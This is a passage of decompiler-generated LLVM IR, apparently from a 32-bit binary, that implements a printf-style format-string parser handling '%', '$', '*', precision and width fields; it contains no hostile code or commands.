  %v3_1000d700 = add i32 %v2_1000d6f0, 24
  %v4_1000d700 = inttoptr i32 %v3_1000d700 to i8*
  store i8 %v1_1000d700, i8* %v4_1000d700, align 1
  %v0_1000d704 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d704 = urem i32 %v0_1000d704, 256
  store i32 %v1_1000d704, i32* %r9.global-to-local, align 4
  %v0_1000d70c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d70c = add i32 %v0_1000d70c, -4
  %v2_1000d70c = inttoptr i32 %v1_1000d70c to i32*
  %v3_1000d70c = load i32, i32* %v2_1000d70c, align 4
  store i32 %v3_1000d70c, i32* %r0.global-to-local, align 4
  %v4_1000d710 = icmp eq i32 %v1_1000d704, %v3_1000d70c
  br i1 %v4_1000d710, label %dec_label_pc_1000d718, label %dec_label_pc_1000db88

dec_label_pc_1000d718:                            ; preds = %dec_label_pc_1000d6ec
  %v3_1000d708 = icmp eq i32 %v1_1000d704, 0
  br i1 %v3_1000d708, label %dec_label_pc_1000d720, label %dec_label_pc_1000d71c

dec_label_pc_1000d71c:                            ; preds = %dec_label_pc_1000d718
  %v0_1000d71c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d71c = add i32 %v0_1000d71c, -1
  store i32 %v1_1000d71c, i32* %ctr.global-to-local, align 4
  %v2_1000d71c = icmp eq i32 %v1_1000d71c, 0
  br i1 %v2_1000d71c, label %dec_label_pc_1000d720, label %dec_label_pc_1000d71c.dec_label_pc_1000d6ec_crit_edge

dec_label_pc_1000d71c.dec_label_pc_1000d6ec_crit_edge: ; preds = %dec_label_pc_1000d71c
  %v0_1000d6ec.pre = load i32, i32* @r8, align 4
  %v0_1000d6f0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000d6f4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000d6ec

dec_label_pc_1000d720:                            ; preds = %dec_label_pc_1000d71c, %dec_label_pc_1000d718
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000d724 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000d72c

dec_label_pc_1000d72c:                            ; preds = %dec_label_pc_1000d6c0, %dec_label_pc_1000d720
  %v2_1000d73c.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000d6c0 ], [ %v2_1000d6e8, %dec_label_pc_1000d720 ]
  %storemerge3 = phi i32 [ %v2_1000d6c0, %dec_label_pc_1000d6c0 ], [ %v2_1000d724, %dec_label_pc_1000d720 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  store i32 268566528, i32* @r25, align 4
  store i32 %v2_1000d73c.pre-phi, i32* @r29, align 4
  br label %dec_label_pc_1000d74c

dec_label_pc_1000d748:                            ; preds = %dec_label_pc_1000d858, %dec_label_pc_1000d8dc
  %v0_1000d748 = phi i32 [ %v1_1000d8dc, %dec_label_pc_1000d8dc ], [ %v0_1000d840, %dec_label_pc_1000d858 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000d8dc ], [ %stack_var_-84.2, %dec_label_pc_1000d858 ]
  store i32 %v0_1000d748, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d74c

dec_label_pc_1000d74c:                            ; preds = %dec_label_pc_1000d72c, %dec_label_pc_1000d748
  %v0_1000d760 = phi i32 [ %storemerge3, %dec_label_pc_1000d72c ], [ %v0_1000d748, %dec_label_pc_1000d748 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000d72c ], [ %stack_var_-84.0, %dec_label_pc_1000d748 ]
  %v1_1000d74c = inttoptr i32 %v0_1000d760 to i8*
  %v2_1000d74c = load i8, i8* %v1_1000d74c, align 1
  %v3_1000d74c = zext i8 %v2_1000d74c to i32
  store i32 %v3_1000d74c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d760, i32* @r30, align 4
  %v3_1000d754 = icmp eq i8 %v2_1000d74c, 42
  br i1 %v3_1000d754, label %dec_label_pc_1000d75c, label %dec_label_pc_1000d76c

dec_label_pc_1000d75c:                            ; preds = %dec_label_pc_1000d74c
  %v0_1000d75c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d75c = mul i32 %v0_1000d75c, -4
  store i32 %v1_1000d75c, i32* %r0.global-to-local, align 4
  %v1_1000d760 = add i32 %v0_1000d760, 1
  store i32 %v1_1000d760, i32* @r30, align 4
  %v0_1000d764 = load i32, i32* @r1, align 4
  %v2_1000d764 = add i32 %v0_1000d764, %v1_1000d75c
  store i32 %v2_1000d764, i32* %r9.global-to-local, align 4
  %v0_1000d768 = load i32, i32* @r27, align 4
  %v2_1000d768 = add i32 %v2_1000d764, 8
  %v3_1000d768 = inttoptr i32 %v2_1000d768 to i32*
  store i32 %v0_1000d768, i32* %v3_1000d768, align 4
  %v0_1000d784.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d76c

dec_label_pc_1000d76c:                            ; preds = %dec_label_pc_1000d74c, %dec_label_pc_1000d75c
  %v0_1000d784.pre = phi i32 [ %v0_1000d760, %dec_label_pc_1000d74c ], [ %v0_1000d784.pre.pre, %dec_label_pc_1000d75c ]
  %v3_1000d76c = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_1000d76c, i32* %r6.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1000d784

dec_label_pc_1000d778:                            ; preds = %dec_label_pc_1000d784
  %v2_1000d78c = icmp sgt i32 %v0_1000d7d0, 4094
  br i1 %v2_1000d78c, label %dec_label_pc_1000d780, label %dec_label_pc_1000d77c

dec_label_pc_1000d77c:                            ; preds = %dec_label_pc_1000d778
  %v1_1000d77c = add i32 %v2_1000d794, -48
  store i32 %v1_1000d77c, i32* @r7, align 4
  br label %dec_label_pc_1000d780

dec_label_pc_1000d780:                            ; preds = %dec_label_pc_1000d778, %dec_label_pc_1000d77c
  %v0_1000d78815 = phi i32 [ %v0_1000d7d0, %dec_label_pc_1000d778 ], [ %v1_1000d77c, %dec_label_pc_1000d77c ]
  %v1_1000d780 = add i32 %v0_1000d800, 1
  store i32 %v1_1000d780, i32* @r30, align 4
  br label %dec_label_pc_1000d784

dec_label_pc_1000d784:                            ; preds = %dec_label_pc_1000d76c, %dec_label_pc_1000d780
  %v0_1000d7d0 = phi i32 [ 0, %dec_label_pc_1000d76c ], [ %v0_1000d78815, %dec_label_pc_1000d780 ]
  %v0_1000d800 = phi i32 [ %v0_1000d784.pre, %dec_label_pc_1000d76c ], [ %v1_1000d780, %dec_label_pc_1000d780 ]
  %v1_1000d784 = inttoptr i32 %v0_1000d800 to i8*
  %v2_1000d784 = load i8, i8* %v1_1000d784, align 1
  %v3_1000d784 = zext i8 %v2_1000d784 to i32
  store i32 %v3_1000d784, i32* @r8, align 4
  %v1_1000d788 = mul i32 %v0_1000d7d0, 10
  %v1_1000d790 = mul nuw nsw i32 %v3_1000d784, 2
  store i32 %v1_1000d790, i32* %r9.global-to-local, align 4
  %v2_1000d794 = add i32 %v3_1000d784, %v1_1000d788
  store i32 %v2_1000d794, i32* %r11.global-to-local, align 4
  %v2_1000d798 = add i32 %v1_1000d790, %v3_1000d76c
  %v3_1000d798 = inttoptr i32 %v2_1000d798 to i16*
  %v4_1000d798 = load i16, i16* %v3_1000d798, align 2
  %v5_1000d798 = zext i16 %v4_1000d798 to i32
  store i32 %v5_1000d798, i32* %r0.global-to-local, align 4
  %v1_1000d79c = and i32 %v5_1000d798, 8
  store i32 %v1_1000d79c, i32* %r9.global-to-local, align 4
  %v3_1000d79c = icmp eq i32 %v1_1000d79c, 0
  br i1 %v3_1000d79c, label %dec_label_pc_1000d7a4, label %dec_label_pc_1000d778

dec_label_pc_1000d7a4:                            ; preds = %dec_label_pc_1000d784
  %v0_1000d7a4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d7a4 = add i32 %v0_1000d7a4, -1
  %v2_1000d7a4 = inttoptr i32 %v1_1000d7a4 to i8*
  %v3_1000d7a4 = load i8, i8* %v2_1000d7a4, align 1
  %v4_1000d7a4 = zext i8 %v3_1000d7a4 to i32
  store i32 %v4_1000d7a4, i32* %r0.global-to-local, align 4
  %v3_1000d7a8 = icmp eq i8 %v3_1000d7a4, 37
  br i1 %v3_1000d7a8, label %dec_label_pc_1000d7b0, label %dec_label_pc_1000d878

dec_label_pc_1000d7b0:                            ; preds = %dec_label_pc_1000d7a4
  %v3_1000d7b0 = icmp eq i8 %v2_1000d784, 36
  br i1 %v3_1000d7b0, label %dec_label_pc_1000d7b8, label %dec_label_pc_1000d7ec

dec_label_pc_1000d7b8:                            ; preds = %dec_label_pc_1000d7b0
  %tmp58 = icmp slt i32 %v0_1000d7d0, 1
  br i1 %tmp58, label %dec_label_pc_1000d7ec, label %dec_label_pc_1000d7c0

dec_label_pc_1000d7c0:                            ; preds = %dec_label_pc_1000d7b8
  %v0_1000d7c0 = load i32, i32* @r26, align 4
  %v3_1000d7c0 = icmp eq i32 %v0_1000d7c0, 0
  %v1_1000d7c4 = add i32 %v0_1000d800, 1
  store i32 %v1_1000d7c4, i32* %r10.global-to-local, align 4
  br i1 %v3_1000d7c0, label %dec_label_pc_1000db88, label %dec_label_pc_1000d7cc

dec_label_pc_1000d7cc:                            ; preds = %dec_label_pc_1000d7c0
  %v3_1000d7cc = icmp sgt i32 %v0_1000d7d0, %v0_1000d7c0
  br i1 %v3_1000d7cc, label %dec_label_pc_1000d7d8, label %dec_label_pc_1000d7e4

dec_label_pc_1000d7d8:                            ; preds = %dec_label_pc_1000d7cc
  store i32 %v0_1000d7d0, i32* @r26, align 4
  br label %dec_label_pc_1000d7e4

dec_label_pc_1000d7e0:                            ; preds = %dec_label_pc_1000d808, %dec_label_pc_1000d800
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000d7e4

dec_label_pc_1000d7e4:                            ; preds = %dec_label_pc_1000d7cc, %dec_label_pc_1000d7d8, %dec_label_pc_1000d7e0
  %v0_1000d7e4 = phi i32 [ %v0_1000d7a4, %dec_label_pc_1000d7e0 ], [ %v1_1000d7c4, %dec_label_pc_1000d7d8 ], [ %v1_1000d7c4, %dec_label_pc_1000d7cc ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000d7e0 ], [ %v0_1000d7d0, %dec_label_pc_1000d7d8 ], [ %v0_1000d7d0, %dec_label_pc_1000d7cc ]
  br label %dec_label_pc_1000d820

dec_label_pc_1000d7ec:                            ; preds = %dec_label_pc_1000d7b0, %dec_label_pc_1000d7b8
  %v0_1000d7ec = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000d7ec, 1
  br i1 %tmp59, label %dec_label_pc_1000d800, label %dec_label_pc_1000d7f4

dec_label_pc_1000d7f4:                            ; preds = %dec_label_pc_1000d7ec
  %v3_1000d7f4 = icmp eq i8 %v2_1000d784, 109
  br i1 %v3_1000d7f4, label %dec_label_pc_1000d878, label %dec_label_pc_1000db88

dec_label_pc_1000d800:                            ; preds = %dec_label_pc_1000d7ec
  %v3_1000d800 = icmp ugt i32 %v0_1000d800, %v0_1000d7a4
  br i1 %v3_1000d800, label %dec_label_pc_1000d808, label %dec_label_pc_1000d7e0

dec_label_pc_1000d808:                            ; preds = %dec_label_pc_1000d800
  %v1_1000d808 = inttoptr i32 %v0_1000d7a4 to i8*
  %v2_1000d808 = load i8, i8* %v1_1000d808, align 1
  %v3_1000d808 = zext i8 %v2_1000d808 to i32
  store i32 %v3_1000d808, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d7a4, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000d814 = icmp eq i8 %v2_1000d808, 48
  br i1 %v3_1000d814, label %dec_label_pc_1000d7e0, label %dec_label_pc_1000d87c

dec_label_pc_1000d820:                            ; preds = %dec_label_pc_1000d83c, %dec_label_pc_1000d7e4
  %v0_1000d840 = phi i32 [ %v0_1000d7e4, %dec_label_pc_1000d7e4 ], [ %v1_1000d840, %dec_label_pc_1000d83c ]
  store i32 %v0_1000d840, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_100194f0.722 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000d830 = inttoptr i32 %v0_1000d840 to i8*
  br label %dec_label_pc_1000d828

dec_label_pc_1000d828:                            ; preds = %dec_label_pc_1000d848, %dec_label_pc_1000d820
  %v1_1000d83c = phi i32 [ %v1_1000d84c, %dec_label_pc_1000d848 ], [ 1, %dec_label_pc_1000d820 ]
  %v0_1000d828 = phi i32 [ %v1_1000d82c, %dec_label_pc_1000d848 ], [ ptrtoint ([8 x i8]* @global_var_100194f0.722 to i32), %dec_label_pc_1000d820 ]
  %v1_1000d828 = inttoptr i32 %v0_1000d828 to i8*
  %v2_1000d828 = load i8, i8* %v1_1000d828, align 1
  %v3_1000d828 = zext i8 %v2_1000d828 to i32
  store i32 %v3_1000d828, i32* %r9.global-to-local, align 4
  %v1_1000d82c = add i32 %v0_1000d828, 1
  store i32 %v1_1000d82c, i32* %r11.global-to-local, align 4
  %v2_1000d830 = load i8, i8* %v1_1000d830, align 1
  %v3_1000d830 = zext i8 %v2_1000d830 to i32
  store i32 %v3_1000d830, i32* %r0.global-to-local, align 4
  %v4_1000d834 = icmp eq i8 %v2_1000d830, %v2_1000d828
  br i1 %v4_1000d834, label %dec_label_pc_1000d83c, label %dec_label_pc_1000d848

dec_label_pc_1000d83c:                            ; preds = %dec_label_pc_1000d828
  %v0_1000d83c = load i32, i32* %r5.global-to-local, align 4
  %v2_1000d83c = or i32 %v0_1000d83c, %v1_1000d83c
  store i32 %v2_1000d83c, i32* %r5.global-to-local, align 4
  %v1_1000d840 = add i32 %v0_1000d840, 1
  br label %dec_label_pc_1000d820

dec_label_pc_1000d848:                            ; preds = %dec_label_pc_1000d828
  %v1_1000d848 = inttoptr i32 %v1_1000d82c to i8*
  %v2_1000d848 = load i8, i8* %v1_1000d848, align 1
  %v3_1000d848 = zext i8 %v2_1000d848 to i32
  store i32 %v3_1000d848, i32* %r0.global-to-local, align 4
  %v1_1000d84c = mul i32 %v1_1000d83c, 2
  store i32 %v1_1000d84c, i32* %r10.global-to-local, align 4
  %v3_1000d850 = icmp eq i8 %v2_1000d848, 0
  br i1 %v3_1000d850, label %dec_label_pc_1000d858, label %dec_label_pc_1000d828

dec_label_pc_1000d858:                            ; preds = %dec_label_pc_1000d848
  %v1_1000d858 = add i32 %v0_1000d840, -1
  %v2_1000d858 = inttoptr i32 %v1_1000d858 to i8*
  %v3_1000d858 = load i8, i8* %v2_1000d858, align 1
  %v4_1000d858 = zext i8 %v3_1000d858 to i32
  store i32 %v4_1000d858, i32* %r0.global-to-local, align 4
  %v0_1000d85c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d85c = and i32 %v0_1000d85c, 10
  store i32 0, i32* @r7, align 4
  %v1_1000d864 = udiv i32 %v1_1000d85c, 2
  store i32 %v1_1000d864, i32* %r9.global-to-local, align 4
  %v3_1000d868 = icmp eq i8 %v3_1000d858, 37
  %v2_1000d86c = sub nuw nsw i32 -1, %v1_1000d864
  %v3_1000d86c = and i32 %v0_1000d85c, %v2_1000d86c
  store i32 %v3_1000d86c, i32* %r5.global-to-local, align 4
  br i1 %v3_1000d868, label %dec_label_pc_1000d87c, label %dec_label_pc_1000d748

dec_label_pc_1000d878:                            ; preds = %dec_label_pc_1000d7a4, %dec_label_pc_1000d7f4
  store i32 %v0_1000d7a4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d87c

dec_label_pc_1000d87c:                            ; preds = %dec_label_pc_1000d808, %dec_label_pc_1000d858, %dec_label_pc_1000d878
  %v0_1000d8b0 = phi i32 [ 0, %dec_label_pc_1000d858 ], [ %v0_1000d7d0, %dec_label_pc_1000d808 ], [ %v0_1000d7d0, %dec_label_pc_1000d878 ]
  %v1_1000d8bc = phi i32 [ %v0_1000d840, %dec_label_pc_1000d858 ], [ %v0_1000d800, %dec_label_pc_1000d808 ], [ %v0_1000d800, %dec_label_pc_1000d878 ]
  %v0_1000d8b8 = phi i32 [ %v1_1000d82c, %dec_label_pc_1000d858 ], [ %v0_1000d7a4, %dec_label_pc_1000d808 ], [ %v0_1000d7a4, %dec_label_pc_1000d878 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000d858 ], [ %stack_var_-84.1, %dec_label_pc_1000d808 ], [ %stack_var_-84.1, %dec_label_pc_1000d878 ]
  %v1_1000d87c = inttoptr i32 %v0_1000d8b8 to i8*
  %v2_1000d87c = load i8, i8* %v1_1000d87c, align 1
  %v3_1000d87c = zext i8 %v2_1000d87c to i32
  store i32 %v3_1000d87c, i32* %r0.global-to-local, align 4
  %v3_1000d880 = icmp eq i8 %v2_1000d87c, 42
  br i1 %v3_1000d880, label %dec_label_pc_1000d888, label %dec_label_pc_1000d8c8

dec_label_pc_1000d888:                            ; preds = %dec_label_pc_1000d87c
  %v0_1000d888 = load i32, i32* @r26, align 4
  %v3_1000d888 = icmp eq i32 %v0_1000d888, 0
  br i1 %v3_1000d888, label %dec_label_pc_1000d8b8, label %dec_label_pc_1000d890

dec_label_pc_1000d890:                            ; preds = %dec_label_pc_1000d888
  %v1_1000d890 = inttoptr i32 %v1_1000d8bc to i8*
  %v2_1000d890 = load i8, i8* %v1_1000d890, align 1
  %v3_1000d890 = zext i8 %v2_1000d890 to i32
  store i32 %v3_1000d890, i32* %r0.global-to-local, align 4
  %v3_1000d894 = icmp eq i8 %v2_1000d890, 36
  br i1 %v3_1000d894, label %dec_label_pc_1000d89c, label %dec_label_pc_1000db88

dec_label_pc_1000d89c:                            ; preds = %dec_label_pc_1000d890
  %tmp60 = icmp slt i32 %v0_1000d8b0, 1
  br i1 %tmp60, label %dec_label_pc_1000db88, label %dec_label_pc_1000d8a4

dec_label_pc_1000d8a4:                            ; preds = %dec_label_pc_1000d89c
  %v0_1000d8a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d8a4 = mul i32 %v0_1000d8a4, -4
  %v1_1000d8a8 = add i32 %v1_1000d8bc, 1
  store i32 %v1_1000d8a8, i32* @r30, align 4
  %v0_1000d8ac = load i32, i32* @r29, align 4
  %v2_1000d8ac = add i32 %v0_1000d8ac, %v1_1000d8a4
  store i32 %v2_1000d8ac, i32* %r9.global-to-local, align 4
  %v2_1000d8b0 = add i32 %v2_1000d8ac, 12
  %v3_1000d8b0 = inttoptr i32 %v2_1000d8b0 to i32*
  store i32 %v0_1000d8b0, i32* %v3_1000d8b0, align 4
  %v0_1000d8d0.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d8c4

dec_label_pc_1000d8b8:                            ; preds = %dec_label_pc_1000d888
  %v1_1000d8b8 = add i32 %v0_1000d8b8, 1
  store i32 %v1_1000d8b8, i32* %r0.global-to-local, align 4
  %v4_1000d8bc = icmp eq i32 %v1_1000d8b8, %v1_1000d8bc
  br i1 %v4_1000d8bc, label %dec_label_pc_1000d8c4, label %dec_label_pc_1000db88

dec_label_pc_1000d8c4:                            ; preds = %dec_label_pc_1000d8b8, %dec_label_pc_1000d8a4
  %v0_1000d8d0.pre = phi i32 [ %v1_1000d8bc, %dec_label_pc_1000d8b8 ], [ %v0_1000d8d0.pre.pre, %dec_label_pc_1000d8a4 ]
  store i32 -2147483648, i32* @r7, align 4
  br label %dec_label_pc_1000d8c8

dec_label_pc_1000d8c8:                            ; preds = %dec_label_pc_1000d87c, %dec_label_pc_1000d8c4
  %v0_1000d8d0 = phi i32 [ %v1_1000d8bc, %dec_label_pc_1000d87c ], [ %v0_1000d8d0.pre, %dec_label_pc_1000d8c4 ]
  %v0_1000d8e0 = phi i32 [ %v0_1000d8b0, %dec_label_pc_1000d87c ], [ -2147483648, %dec_label_pc_1000d8c4 ]
  %v0_1000d8c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000d8c8 = icmp eq i32 %v0_1000d8c8, 0
  %v1_1000d8d0 = inttoptr i32 %v0_1000d8d0 to i8*
  br i1 %v3_1000d8c8, label %dec_label_pc_1000d8d0, label %dec_label_pc_1000d8f4

dec_label_pc_1000d8d0:                            ; preds = %dec_label_pc_1000d8c8
  %v2_1000d8d0 = load i8, i8* %v1_1000d8d0, align 1
  %v3_1000d8d0 = zext i8 %v2_1000d8d0 to i32
  store i32 %v3_1000d8d0, i32* %r0.global-to-local, align 4
  %v3_1000d8d4 = icmp eq i8 %v2_1000d8d0, 46
  br i1 %v3_1000d8d4, label %dec_label_pc_1000d8dc, label %dec_label_pc_1000d8ec

dec_label_pc_1000d8dc:                            ; preds = %dec_label_pc_1000d8d0
  %v1_1000d8dc = add i32 %v0_1000d8d0, 1
  store i32 %v0_1000d8e0, i32* @r31, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d748

dec_label_pc_1000d8ec:                            ; preds = %dec_label_pc_1000d8d0
  store i32 %v0_1000d8e0, i32* @r31, align 4
  br label %dec_label_pc_1000d8f4

dec_label_pc_1000d8f4:                            ; preds = %dec_label_pc_1000d8c8, %dec_label_pc_1000d8ec
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000d8ec ], [ %v0_1000d8e0, %dec_label_pc_1000d8c8 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_1000d8f4 = load i8, i8* %v1_1000d8d0, align 1
  %v3_1000d8f4 = zext i8 %v2_1000d8f4 to i32
  store i32 %v3_1000d8f4, i32* %r10.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10019498.723 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d900

dec_label_pc_1000d900:                            ; preds = %dec_label_pc_1000d90c, %dec_label_pc_1000d8f4
  %v0_1000d90c = phi i32 [ %v1_1000d90c, %dec_label_pc_1000d90c ], [ ptrtoint ([9 x i8]* @global_var_10019498.723 to i32), %dec_label_pc_1000d8f4 ]
  %v1_1000d900 = inttoptr i32 %v0_1000d90c to i8*
  %v2_1000d900 = load i8, i8* %v1_1000d900, align 1
  %v3_1000d900 = zext i8 %v2_1000d900 to i32
  store i32 %v3_1000d900, i32* %r0.global-to-local, align 4
  %v4_1000d904 = icmp eq i8 %v2_1000d8f4, %v2_1000d900
  br i1 %v4_1000d904, label %dec_label_pc_1000d6d0, label %dec_label_pc_1000d90c

dec_label_pc_1000d90c:                            ; preds = %dec_label_pc_1000d900
  %v1_1000d90c = add i32 %v0_1000d90c, 1
  %v2_1000d90c = inttoptr i32 %v1_1000d90c to i8*
  %v3_1000d90c = load i8, i8* %v2_1000d90c, align 1
  %v4_1000d90c = zext i8 %v3_1000d90c to i32
  store i32 %v4_1000d90c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d90c, i32* %r11.global-to-local, align 4
  %v3_1000d910 = icmp eq i8 %v3_1000d90c, 0
  br i1 %v3_1000d910, label %dec_label_pc_1000d918, label %dec_label_pc_1000d900

dec_label_pc_1000d918:                            ; preds = %dec_label_pc_1000d90c, %dec_label_pc_1000d6d0
  %v0_1000d940 = phi i32 [ %v1_1000d6d0, %dec_label_pc_1000d6d0 ], [ %v0_1000d8d0, %dec_label_pc_1000d90c ]
  %v0_1000d93c = phi i32 [ %v0_1000d90c, %dec_label_pc_1000d6d0 ], [ %v1_1000d90c, %dec_label_pc_1000d90c ]
  %v2_1000d920 = sub i32 %v0_1000d93c, ptrtoint ([9 x i8]* @global_var_10019498.723 to i32)
  store i32 %v2_1000d920, i32* %r9.global-to-local, align 4
  %v2_1000d924 = icmp sgt i32 %v2_1000d920, 1
  br i1 %v2_1000d924, label %dec_label_pc_1000d944, label %dec_label_pc_1000d92c

dec_label_pc_1000d92c:                            ; preds = %dec_label_pc_1000d918
  %v1_1000d92c = inttoptr i32 %v0_1000d940 to i8*
  %v2_1000d92c = load i8, i8* %v1_1000d92c, align 1
  %v3_1000d92c = zext i8 %v2_1000d92c to i32
  store i32 %v3_1000d92c, i32* %r0.global-to-local, align 4
  %v1_1000d930 = inttoptr i32 %v0_1000d93c to i8*
  %v2_1000d930 = load i8, i8* %v1_1000d930, align 1
  %v3_1000d930 = zext i8 %v2_1000d930 to i32
  store i32 %v3_1000d930, i32* %r9.global-to-local, align 4
  %v4_1000d934 = icmp eq i8 %v2_1000d92c, %v2_1000d930
  br i1 %v4_1000d934, label %dec_label_pc_1000d93c, label %dec_label_pc_1000d944

dec_label_pc_1000d93c:                            ; preds = %dec_label_pc_1000d92c
  %v1_1000d93c = add i32 %v0_1000d93c, 9
  store i32 %v1_1000d93c, i32* %r11.global-to-local, align 4
  %v1_1000d940 = add i32 %v0_1000d940, 1
  store i32 %v1_1000d940, i32* @r30, align 4
  br label %dec_label_pc_1000d944

dec_label_pc_1000d944:                            ; preds = %dec_label_pc_1000d92c, %dec_label_pc_1000d918, %dec_label_pc_1000d93c
  %v0_1000d948 = phi i32 [ %v0_1000d93c, %dec_label_pc_1000d92c ], [ %v0_1000d93c, %dec_label_pc_1000d918 ], [ %v1_1000d93c, %dec_label_pc_1000d93c ]
  %v0_1000d944 = phi i32 [ %v0_1000d940, %dec_label_pc_1000d92c ], [ %v0_1000d940, %dec_label_pc_1000d918 ], [ %v1_1000d940, %dec_label_pc_1000d93c ]
  %v1_1000d944 = inttoptr i32 %v0_1000d944 to i8*
  %v2_1000d944 = load i8, i8* %v1_1000d944, align 1
  %v3_1000d944 = zext i8 %v2_1000d944 to i32
  store i32 %v3_1000d944, i32* %r10.global-to-local, align 4
  %v1_1000d948 = add i32 %v0_1000d948, 9
  %v2_1000d948 = inttoptr i32 %v1_1000d948 to i8*
  %v3_1000d948 = load i8, i8* %v2_1000d948, align 1
  %v4_1000d948 = zext i8 %v3_1000d948 to i32
  store i32 %v4_1000d948, i32* %r0.global-to-local, align 4
  %v3_1000d94c = icmp eq i8 %v2_1000d944, 0
  %v1_1000d950 = mul nuw nsw i32 %v4_1000d948, 256
  store i32 %v1_1000d950, i32* @r8, align 4
  br i1 %v3_1000d94c, label %dec_label_pc_1000db88, label %dec_label_pc_1000d958

dec_label_pc_1000d958:                            ; preds = %dec_label_pc_1000d944
  %v3_1000d95c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000d95c, i32* %r11.global-to-local, align 4
  %v1_1000d968 = and i32 %v1_1000d950, 1024
  store i32 %v1_1000d968, i32* %r0.global-to-local, align 4
  %v3_1000d968 = icmp eq i32 %v1_1000d968, 0
  store i32 ptrtoint (i32* @global_var_100194cc.725 to i32), i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_100194d8.724 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d978

dec_label_pc_1000d978:                            ; preds = %dec_label_pc_1000d9dc, %dec_label_pc_1000d958
  %v1_1000d984 = phi i32 [ %v1_1000d9dc, %dec_label_pc_1000d9dc ], [ ptrtoint ([21 x i8]* @global_var_100194d8.724 to i32), %dec_label_pc_1000d958 ]
  %v1_1000d978 = inttoptr i32 %v1_1000d984 to i8*
  %v2_1000d978 = load i8, i8* %v1_1000d978, align 1
  %v3_1000d978 = zext i8 %v2_1000d978 to i32
  store i32 %v3_1000d978, i32* %r0.global-to-local, align 4
  %v4_1000d97c = icmp eq i8 %v2_1000d978, %v2_1000d944
  br i1 %v4_1000d97c, label %dec_label_pc_1000d984, label %dec_label_pc_1000d9dc

dec_label_pc_1000d984:                            ; preds = %dec_label_pc_1000d978
  %v2_1000d984 = sub i32 %v1_1000d984, ptrtoint ([21 x i8]* @global_var_100194d8.724 to i32)
  %tmp61 = icmp slt i32 %v2_1000d984, 18
  %brmerge = or i1 %v3_1000d968, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000d998, label %dec_label_pc_1000d994

dec_label_pc_1000d994:                            ; preds = %dec_label_pc_1000d984
  %v1_1000d994 = add i32 %v2_1000d984, -2
  br label %dec_label_pc_1000d998

dec_label_pc_1000d998:                            ; preds = %dec_label_pc_1000d984, %dec_label_pc_1000d994
  %storemerge = phi i32 [ %v1_1000d994, %dec_label_pc_1000d994 ], [ %v2_1000d984, %dec_label_pc_1000d984 ]
  %v0_1000d998 = phi i32 [ %v1_1000d994, %dec_label_pc_1000d994 ], [ %v2_1000d984, %dec_label_pc_1000d984 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000d998 = load i32, i32* @r28, align 4
  %v2_1000d998 = add i32 %v1_1000d998, 32
  %v3_1000d998 = inttoptr i32 %v2_1000d998 to i32*
  store i32 %v0_1000d998, i32* %v3_1000d998, align 4
  store i32 ptrtoint (i32* @global_var_100194cb.726 to i32), i32* %r11.global-to-local, align 4
  %v0_1000d9a4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d9a0

dec_label_pc_1000d9a0:                            ; preds = %dec_label_pc_1000d9a0, %dec_label_pc_1000d998
  %v0_1000d9a0 = phi i32 [ %v1_1000d9a0, %dec_label_pc_1000d9a0 ], [ ptrtoint (i32* @global_var_100194cb.726 to i32), %dec_label_pc_1000d998 ]
  %v1_1000d9a0 = add i32 %v0_1000d9a0, 1
  %v2_1000d9a0 = inttoptr i32 %v1_1000d9a0 to i8*
  %v3_1000d9a0 = load i8, i8* %v2_1000d9a0, align 1
  %v4_1000d9a0 = zext i8 %v3_1000d9a0 to i32
  store i32 %v4_1000d9a0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d9a0, i32* %r11.global-to-local, align 4
  %v3_1000d9a4 = icmp sgt i32 %v0_1000d9a4.pre, %v4_1000d9a0
